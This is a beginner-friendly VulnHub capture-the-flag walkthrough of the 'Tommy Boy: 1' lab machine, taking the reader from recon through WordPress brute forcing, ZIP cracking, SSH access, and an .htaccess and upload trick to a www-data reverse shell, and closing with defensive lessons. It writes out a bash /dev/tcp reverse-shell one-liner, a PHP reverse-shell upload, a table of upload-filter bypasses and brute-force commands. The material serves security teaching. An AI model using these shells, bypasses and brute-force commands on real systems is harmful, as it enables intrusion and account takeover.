# Tommy Boy: 1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
|---|---|
| **Machine** | Tommy Boy: 1 |
| **Difficulty** | **3 — Easy** (stated: *Easy / Intermediate*) |
| **Author** | Brian Johnson |
| **Released** | July 27, 2016 |
| **VulnHub Entry** | [Tommy Boy: 1 on VulnHub](https://vulnhub.com/entry/tommy-boy-1,157/) |
| **Download** | [Tommy Boy: 1 OVA](https://vulnhub.com/entry/tommy-boy-1,157/#download) |
| **Attacker** | Kali Linux (attacker IP `192.168.56.10`, target IP `192.168.56.101`) |
| **Target OS** | Linux (Ubuntu) |

> **Goal:** the machine's stated objective is to restore a backup of the Callahan Auto homepage — but to consider the box fully pwned you must collect **5 flags** and combine their data into one password that unlocks a final secret (`LOOT.ZIP`).
> **Flag locations (this guide):** 1 `flag-numero-uno.txt`, 2 `thisisthesecondflagyayyou.txt`, 3 `flagtres.txt`, 4 `el-flag-numero-quatro.txt`, 5 `/.5.txt`.
> **Note on IPs:** the target IP varies by build. This guide uses `192.168.56.101` as the example target and `192.168.56.10` as the example attacker. Replace both with the addresses you actually discover.

## 0. What you will learn

- **Multi-port reconnaissance:** discovering and prioritising several services (SSH, HTTP, a second web app, FTP).
- **`robots.txt` information leaks:** it can reveal hidden paths *and* flags.
- **WordPress enumeration:** using `wpscan` to find usernames and brute-force a login.
- **User-Agent based access control:** why "only iPhones can see this" is not a security control.
- **Password cracking fundamentals:** generating a targeted wordlist with `crunch` and cracking a ZIP with `fcrackzip`.
- **Password reuse & leakage:** a leaked password leading to SSH access.
- **Local privilege escalation via writable web files:** abusing a world-writable upload directory and a `.htaccess` file to run code as another user.
- **Chained objectives:** collecting multiple flags and combining them into a final key.
- **Defensive thinking:** how a defender prevents each step.

## 1. Reconnaissance — finding the target

Find your own IP and the target's IP on the lab network.

**Check your (attacker) IP:**
```bash
ip a
```

> **How to read it:** Shows your interfaces. Your `192.168.56.x` address is the attacker IP (here `192.168.56.10`).

**Discover live hosts:**

> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo arp-scan --localnet
# or
sudo netdiscover -i eth1 -r 192.168.56.0/24
```

> **How to read it:** A new Linux host on the subnet is the Tommy Boy VM. Confirm it responds:
```bash
ping -c 2 192.168.56.101
```

![host discovery showing the target IP](images/01-recon.png)


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration — many open ports

### 2.1 Full service scan

> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -sC -sV -p- --min-rate 1000 -T4 -oA scans/full 192.168.56.101
```

Realistic output (exact banners/ports may vary by build):

> ### 📖 Concept — FTP, and why "anonymous" is the first thing to try
>
> **FTP** (port 21) predates modern authentication. It sends usernames, passwords and
> file contents in **cleartext**, and it has a built-in convention for public access:
> the account **`anonymous`**, traditionally with an email address (or nothing) as the
> password.
>
> ```bash
> ftp target                     # then: anonymous / (blank)
> curl -s ftp://anonymous:@target/
> wget -r ftp://anonymous:@target/          # mirror the whole tree
> nmap -p21 --script ftp-anon,ftp-vuln-cve2010-4221 target
> ```
>
> Inside an FTP session: `ls`, `cd`, `binary` (**switch mode before downloading
> anything non-text** — ASCII mode corrupts binaries), `get`, `mget`, `put`, `recurse`.
>
> **Two things to check immediately.** First, is anonymous access *enabled*? Second, is
> it **writable** — does `put shell.php` succeed? A writable FTP root that overlaps
> the web document root is a web-shell upload with no exploitation required. Also look
> for `backup.zip`, `creds.txt`, `id_rsa`, `web.config` and any `notes.txt` — authors
> leave the next step in a file named something obvious.
>
> ProFTPD 1.3.3c specifically ships a **compile-time backdoor** (`telnet target 6200`
> gives root); check the exact version against Exploit-DB before assuming you need
> credentials.
>
> **Deep dive:** [CONCEPTS §9.5 — FTP](../../docs/CONCEPTS.md#95-ftp--port-21)

```text
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.2.22 ((Ubuntu))
8008/tcp  open  http    Apache httpd 2.2.22 ((Ubuntu))
65534/tcp open  ftp     vsftpd 2.0.8 or later
```

> **How to read it:** Several services. Port 80 is the main Callahan Auto website; port **8008** is a *second* web app; port **65534** is an FTP server (non-standard port).
> **Why it works:** Multiple web services multiply the attack surface. Always enumerate each one separately.

### 2.2 The main site (port 80) and `robots.txt`
```bash
curl http://192.168.56.101/
curl http://192.168.56.101/robots.txt
```
```text
User-agent: *
Disallow: /6packsofb...soda
Disallow: /lukeiamyourfather
Disallow: /lookalivelowbridge
Disallow: /flag-numero-uno.txt
```

> **How to read it:** `robots.txt` is meant to tell search engines what not to index — but it happily tells *us* about hidden paths. One entry is literally the first flag.

Grab **Flag 1**:
```bash
curl http://192.168.56.101/flag-numero-uno.txt
```
```text
This is the first of five flags in the Callhan Auto server...
Flag data: B34rcl4ws
```

> **How to read it:** Flag data `B34rcl4ws`. Record it — we need all five at the end.

### 2.3 The second site (port 8008)
```bash
curl http://192.168.56.101:8008/
```

The page references a "Nick" and his private drop-box at `/NickIzL33t`. We will come back to it.

### 2.4 FTP (port 65534)
```bash
ftp 192.168.56.101 65534
```
Try anonymous login (`anonymous` / blank). If it refuses, note it and move on — a later hint points here.

> **Note:** Some builds accept anonymous FTP and hand you files; on others FTP is a red herring. The documented path below does not require FTP, but it is worth checking every service.

![nmap showing ports 22, 80, 8008 and 65534](images/02-nmap.png)

## 3. Foothold — web clues, cracking, and SSH

### 3.1 The company blog (WordPress) and Flag 2
Browse the main site and follow the hint to `/prehistoricforest/`. This is a WordPress-powered "Callahan Employee Blog."

Read the posts and comments. One comment/link points to:
```text
http://192.168.56.101/prehistoricforest/thisisthesecondflagyayyou.txt
```
```text
Flag data: Z4l1nsky
```

> **How to read it:** **Flag 2 = `Z4l1nsky`**. Blog content is often a deliberate breadcrumb — read every post and comment.

Enumerate WordPress users:

> ### 📖 Concept — How does WordPress leak usernames?
>
> WordPress builds author archive URLs from a **numeric user ID**:
>
> ```text
> /wordpress/?author=1   →  301 → /wordpress/author/michael/
> /wordpress/?author=2   →  301 → /wordpress/author/steven/
> ```
>
> The ID counts up from 1 and the redirect target contains the **username**.
> `wpscan -e u` just loops the IDs until they stop resolving. Watch it happen by hand
> in a browser — that is worth more than reading about it.
>
> **The `-e` flag chooses what to enumerate:** `u` users · `p` **plugins** (the most
> common WordPress compromise vector) · `t` themes · `vp`/`vt` only *vulnerable*
> plugins/themes · `cb` config backups (`wp-config.php.bak` — a jackpot) · `dbe`
> database exports.
>
> wpscan also labels *how* it found things, and the labels matter: **Passive
> Detection** means inferred from data the site publishes anyway (RSS, bylines) — the
> site does not notice. **Aggressive Detection** means it actively probed (brute
> forcing author IDs, submitting bad logins to read error messages) — which writes
> log entries.
>
> **Why usernames matter:** they are half of every credential pair. With two known
> usernames you can attack `wp-login.php` *and* SSH directly instead of guessing both
> halves.
>
> **Deep dive:** [CONCEPTS §9.2 — WordPress / wpscan](../../docs/CONCEPTS.md#92-wordpress--wpscan)

```bash
wpscan --url http://192.168.56.101/prehistoricforest/ --enumerate u
```

> **How to read it:** `wpscan` lists valid WordPress usernames (e.g. `bigtom`, `tom`). Knowing valid usernames makes brute-forcing far more targeted.

### 3.2 The "iPhone only" page and Flag 3
Visit the second web app's hidden directory:
```bash
curl http://192.168.56.101:8008/NickIzL33t
```
```text
only me and Steve Jobs can see this content
```

> **How to read it:** "Steve Jobs" is a hint to use an **Apple/iPhone `User-Agent`**. The server is checking the `User-Agent` header — a client-controlled value, so we simply lie.

Resend with an iPhone User-Agent:
```bash
curl -A "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A365 Safari/600.1.4" \
  http://192.168.56.101:8008/NickIzL33t
```

> **Why it works:** The page now reveals a hint: you must know the **exact `.html` filename** to "break into the fortress." That means directory/file brute-forcing *with the same iPhone User-Agent*.

Brute-force for HTML files (with the iPhone User-Agent):

> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)
> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)

```bash
feroxbuster -u http://192.168.56.101:8008/NickIzL33t \
  -w /usr/share/wordlists/rockyou.txt -x html -t 100 \
  -a "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A365 Safari/600.1.4"
```

You find `fallon1.html`. Its source points to **Flag 3**:
```bash
curl -A "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) ..." \
  http://192.168.56.101:8008/NickIzL33t/flagtres.txt
```
```text
Flag data: TinyHead
```

> **How to read it:** **Flag 3 = `TinyHead`**.

![iPhone User-Agent revealing the hidden page](images/03-ua-bypass.png)

### 3.3 Crack the password ZIP
The same area offers `hint.txt` and a password-protected ZIP (`t0msp4ssw0rdz.zip`).

```bash
curl -A "iPhone ..." http://192.168.56.101:8008/NickIzL33t/hint.txt
```
```text
# hint: password pattern -> bev,%%@@^1995
```

> **How to read it:** The hint gives a mask for a password. Build a targeted wordlist with `crunch` rather than a generic one:
```bash
crunch 13 13 -t bev,%%@@^1995 -o /root/desktop/dict.txt
```

Crack the ZIP with `fcrackzip`:
```bash
fcrackzip -u -D -p /root/desktop/dict.txt t0msp4ssw0rdz.zip
```
```text
PASSWORD FOUND!!!!: pw == bevH00tr$1995
```

> **Why it works:** The password follows a predictable pattern, so a custom mask is orders of magnitude faster than a general list. Unzip and read `passwords.txt`:
```text
Callahan Auto Server
---------------------------
Username: bigtommysenior
Password: fatguyinalittlecoat
Note: after the "fatguyinalittlecoat" part there are some numbers, but I don't remember what they are.
However, I wrote myself a draft on the company blog with that information.
```

> **How to read it:** We now have a username (`bigtommysenior`), a partial password, and a hint that the missing numbers are in a WordPress **draft**. The password is incomplete, so we keep going.

### 3.4 Brute-force WordPress, then SSH
Brute-force the `tom` account with the known users:
```bash
wpscan --url http://192.168.56.101/prehistoricforest/wp-login.php \
  --usernames tom --passwords /usr/share/wordlists/rockyou.txt
```
```text
[SUCCESS] - tom / tomtom1
```

> **Why it works:** The password is in `rockyou.txt` (a famously common wordlist). The website's Queen-song hint nudged toward `rockyou`.

Log into WordPress as `tom`, find **Big Tom's draft**, and read the missing digits:
```text
I have updated the full server password: fatguyinalittlecoat1938!!
```

> **How to read it:** We now have the full credential `bigtommysenior:fatguyinalittlecoat1938!!`. Use it over SSH:
```bash
ssh bigtommysenior@192.168.56.101
```

### 3.5 Flag 4 and the homepage backup
You are in. Look around the home directory:
```bash
ls -la
cat el-flag-numero-quatro.txt
```
```text
Flag data: EditButton
```

> **How to read it:** **Flag 4 = `EditButton`**. The directory also contains `callahanbak.bak` (the backup homepage) and `LOOT.ZIP` (the final secret).

Restore the homepage as the objective instructs:
```bash
cp callahanbak.bak /var/www/html/index.html
```

> **Why it works:** Replacing `index.html` with the backup satisfies the stated goal and, importantly, marks progress. Flag 4 told us the fifth flag is at the root of the server.

![SSH as bigtommysenior, Flag 4](images/04-ssh-flag4.png)


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation — escalate to `www-data` for Flag 5

### 4.1 Find the fifth flag and why we can't read it
Flag 4 said the last flag is `/5.txt`. It is actually a hidden file:
```bash
ls -la /
```
```text
-rwxr-x--- 1 www-data www-data 520 ... .5.txt
```

> **How to read it:** `/.5.txt` is owned by user/group **`www-data`** with `-rwxr-x---`, so only `www-data` (and root) can read it. We are `bigtommysenior` — not enough. We need to **become `www-data`**.

### 4.2 The world-writable upload directory
Recall the `/NickIzL33t` area. There is a "P4TCH_4D4MS" drop-box with an upload form. Inspect the web root and upload directory:
```bash
ls -ld /var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/uploads/
```
```text
drwxrwxrwx 2 www-data www-data 4096 Sep  6 14:09 .../P4TCH_4D4MS/uploads/
```

> **How to read it:** `drwxrwxrwx` means **everyone** can read, write and execute in this directory. That is a huge misconfiguration — we can drop files there, and Apache (running as `www-data`) will serve/execute them.

Now inspect the existing `.htaccess`:
```bash
cat /var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/uploads/.htaccess
```
```text
BrowserMatchNoCase "iPhone" ...
AddType application/x-httpd-php .gif
```

> **How to read it:** This `.htaccess` makes `.gif` files execute as PHP, and restricts access to iPhone user-agents. We do not have write access to the file, **but we do have write access to the directory**, so we can rename it and drop in our own.

### 4.3 Replace `.htaccess` and upload a reverse shell
Rename the restrictive `.htaccess` and create a permissive one that executes `.php` for everyone:
```bash
cd /var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/uploads
mv .htaccess .htaccess.bak
cat > .htaccess <<'EOF'
AddType application/x-httpd-php .php
<IfModule mod_authz_core.c>
    Require all granted
</IfModule>
<IfModule !mod_authz_core.c>
    Order allow,deny
    Allow from all
</IfModule>
EOF
```

> **Why it works:** Apache reads `.htaccess` from the directory. By replacing it we (a) allow everyone in and (b) tell Apache to run `.php` files as PHP. Now any `.php` we place here is executable code.

Copy a PHP reverse shell into the uploads directory (edit the IP/port first):

> ### 📖 Concept — File upload: defences and their bypasses
>
> The goal is to get a file **into a directory the web server executes**. Every
> defence has a standard bypass:
>
> | Defence | Bypass |
> | --- | --- |
> | Extension blacklist (`.php` blocked) | `.phtml`, `.php5`, `.php7`, `.pht`, `.phar`, `.pHp` (case), `.php.jpg`, `.php%00.jpg` (null byte, old PHP) |
> | MIME-type check (`Content-Type: image/jpeg`) | Change the header in Burp — it is **client-controlled and worthless** |
> | `getimagesize()` / magic-byte check | Prepend real image bytes: `cat legit.jpg shell.php > polyglot.php.jpg` |
> | Randomised filename | Reverse-engineer the scheme (e.g. `md5(name.rand())`), or just **read the response** — many apps echo the stored path |
> | Upload outside the docroot | Find the real path from an error message, or use a plugin that serves it |
> | Double extension stripped | `shell.php.png`, where the app removes only the last extension |
>
> **Always verify where the file landed.** If the app does not tell you, infer it from
> the framework's conventions (`/wp-content/uploads/YYYY/MM/`, `/storage/originals/`,
> `images/`) and confirm with a HEAD request before wiring up a reverse shell.
>
> **Deep dive:** [CONCEPTS §13.5 — File upload](../../docs/CONCEPTS.md#135-file-upload)
> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
# set $ip='192.168.56.10'; $port=443;
```

Start a listener and browse to the shell:
```bash
nc -lvnp 443
```
```bash
curl "http://192.168.56.101:8008/NickIzL33t/P4TCH_4D4MS/uploads/php-reverse-shell.php"
```

> **Why it works:** Apache executes the PHP as the web user (`www-data`) and the payload connects back to us. We now have a shell as `www-data`.

Listener output:
```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 40218
www-data@CallahanAutoSrv01:/$
```

### 4.4 Capture Flag 5
```bash
cat /.5.txt
```
```text
FIFTH FLAG!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
YOU DID IT!!!!!!!!!!!!!!!!!!!!!!!!!!!!
...
Flag data: Buttcrack
```

> **How to read it:** **Flag 5 = `Buttcrack`**. The file also instructs you to concatenate the flag data, in order, into one password.

![www-data shell reading /.5.txt](images/05-flag5.png)

### 4.5 Combine the flags and unlock the final secret
The five flags, in order:

| # | File | Flag data |
|---|---|---|
| 1 | `flag-numero-uno.txt` | `B34rcl4ws` |
| 2 | `thisisthesecondflagyayyou.txt` | `Z4l1nsky` |
| 3 | `flagtres.txt` | `TinyHead` |
| 4 | `el-flag-numero-quatro.txt` | `EditButton` |
| 5 | `/.5.txt` | `Buttcrack` |

Concatenated: `B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack`

Back as `bigtommysenior`, unzip `LOOT.ZIP` with that password:
```bash
unzip LOOT.ZIP
```
```text
[LOOT.ZIP] THE-END.txt password: B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack
  inflating: THE-END.txt
```
```bash
cat THE-END.txt
```
```text
YOU CAME. YOU SAW. ... PWNED.
```

> **How to read it:** Combining the flag data gives the archive password, revealing the final message. **The box is fully pwned.** (Exact `THE-END.txt` text varies by build — do not assume a specific string.)

## 5. Summary of vulnerabilities

| Vulnerability | Where | Impact | Notes |
|---|---|---|---|
| Sensitive data in `robots.txt` | `http://.../robots.txt` | Leaks hidden paths and Flag 1 | `Disallow: /flag-numero-uno.txt` |
| Info leak in blog content | `/prehistoricforest/` WordPress | Leaks Flag 2 | Read posts/comments |
| User-Agent based access control | Port 8008 `/NickIzL33t` | Bypass "iPhone only" gate | Client-controlled header |
| Weak/predictable password + weak ZIP | `t0msp4ssw0rdz.zip` | Recover credentials file | Cracked with `crunch` + `fcrackzip` |
| WordPress user enumeration & weak password | `/prehistoricforest/wp-login.php` | `tom:tomtom1` | `wpscan` + `rockyou.txt` |
| Credential leakage in WordPress draft | Blog draft | Full SSH password | `bigtommysenior:fatguyinalittlecoat1938!!` |
| FTP on non-standard port | 65534 | Extra attack surface | Check for anonymous access |
| World-writable web upload directory | `.../P4TCH_4D4MS/uploads` | Arbitrary file placement | `drwxrwxrwx` |
| Over-permissive `.htaccess` manipulation | `.../uploads/.htaccess` | PHP execution as `www-data` | Renamed and replaced |
| Over-privileged file ownership | `/.5.txt` owned by `www-data` | Flag exposure | Defensible only if web user is compromised |

> **How to read it:** This machine is a chain of small weaknesses — leaked hints, a client-controlled access gate, a weak password, and a wide-open upload directory — each of which alone is minor but together yield full compromise.

## 6. Defensive lessons (blue team)

- **Treat `robots.txt` as public.** Never list secrets or sensitive paths there. Use proper authentication for anything that should not be seen.
- **Never use `User-Agent` (or any request header) for access control.** Headers are trivially spoofed. Enforce authorization server-side with real authentication.
- **Enforce strong, unique passwords.** Reject dictionary passwords, and never leave incomplete passwords as "hints." Use a password manager and MFA.
- **Protect encrypted archives with strong KDFs.** Legacy ZIP encryption is weak; use AES-256 with a high-iteration KDF for anything sensitive.
- **Disable WordPress user enumeration** and rate-limit / lock out failed logins. Apply MFA to admin accounts and keep WordPress and plugins patched.
- **Do not store credentials in drafts, posts, or comments.** Secrets belong in a secrets manager with strict access control.
- **Make web directories non-writable.** Upload directories should be owned by the service account and **not** world-writable. Rename/disable `.htaccess` overrides (`AllowOverride None`) where possible.
- **Never allow uploaded files to execute.** Store user uploads outside the web root or on a separate, non-executable host/container.
- **Audit file ownership.** The last flag was protected by `www-data` ownership — fine on paper, but it fell the moment the web user was compromised. Minimize what the web user can read.
- **Defense-in-depth:** patch, least privilege, segmentation, and egress monitoring (reverse shells connect outbound) all reduce impact.

## 7. References

Real community writeups consulted during research (same path):

- [Tommy Boy 1 VulnHub Writeup — g0blin Research](https://g0blin.co.uk/tommy-vulnhub-writeup/)
- [Tommy Boy: 1 Walkthrough — geoda-security](https://blog.geoda-security.com/2016/08/tommy-boy1-walkthrough.html)
- [Tommy Boy hacking challenge — Musings from the brainpan](https://blog.techorganic.com/2016/09/07/tommy-boy-hacking-challenge/)
- [Hack the TommyBoy VM (CTF Challenge) — Hacking Articles](https://www.hackingarticles.in/hack-tommyboy-vm-ctf-challenge/)
- [Vulnhub: Tommy Boy 1 Walkthrough — sechub.in](https://sechub.in/view/2804167)
- [TommyBoy v1.0 — StrongShiv8](https://strongshiv8.github.io/posts/TommyBoy1dot0/)
- [Tommy Boy 1.0: A Vulnerable Virtual Machine — 7 Minute Security](https://7minsec.com/blog/2016/07/26/tommyboy/)
- [VulnHub Official Entry — Tommy Boy: 1](https://vulnhub.com/entry/tommy-boy-1,157/)

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — host discovery showing the target IP
- [ ] `images/02-nmap.png` — Nmap scan showing ports 22, 80, 8008, 65534
- [ ] `images/03-ua-bypass.png` — iPhone User-Agent revealing the hidden `/NickIzL33t` page
- [ ] `images/04-ssh-flag4.png` — SSH as `bigtommysenior` and Flag 4
- [ ] `images/05-flag5.png` — `www-data` shell reading `/.5.txt`
- [ ] `images/06-loot.png` — combined flags unlocking `LOOT.ZIP` / `THE-END.txt`

> **How to read it:** Put screenshots in `labs/3-065-tommy-boy-1/images/` and reference them with relative paths as shown above.

---

> ### 📖 How to read this walkthrough
>
